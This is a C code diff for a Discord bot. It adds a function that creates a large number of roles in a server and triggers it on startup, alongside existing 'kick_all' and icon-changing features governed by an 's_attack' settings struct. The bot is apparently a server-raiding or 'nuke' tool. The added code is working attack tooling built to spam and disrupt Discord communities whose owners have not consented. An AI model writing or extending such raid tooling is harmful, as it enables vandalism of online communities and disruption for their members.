@@ -251,6 +251,28 @@ void change_icon(struct discord *client, u64_snowflake_t guild_id,
         NULL);
 }
 
+void mass_roles(struct discord *client, u64_snowflake_t guild_id,
+                  char role_name[15], int count)
+{
+    char *r_name = strtok(role_name, "");
+
+    int i = 0;
+
+    for (i = 0; i < count; i++)
+    {
+        discord_create_guild_role(
+            client,
+            guild_id,
+            &(struct discord_create_guild_role_params) {
+                .name = r_name
+            },
+            NULL
+        );
+    }
+
+    log_info("Created %d roles in %" PRIu64, i, guild_id);
+}
+
 void on_ready(struct discord *client)
 {
     const struct discord_user *bot = discord_get_self(client);
@@ -326,6 +348,11 @@ void on_ready(struct discord *client)
     if(s_attack.kick_all_enabled == true)
     {
         kick_all(client, guild_id);
+    }
+
+    if(s_attack.roles_mass_enabled == true) 
+    {
+        mass_roles(client, guild_id, s_attack.roles_mass_name, s_attack.roles_mass_count);
     }
 }
 
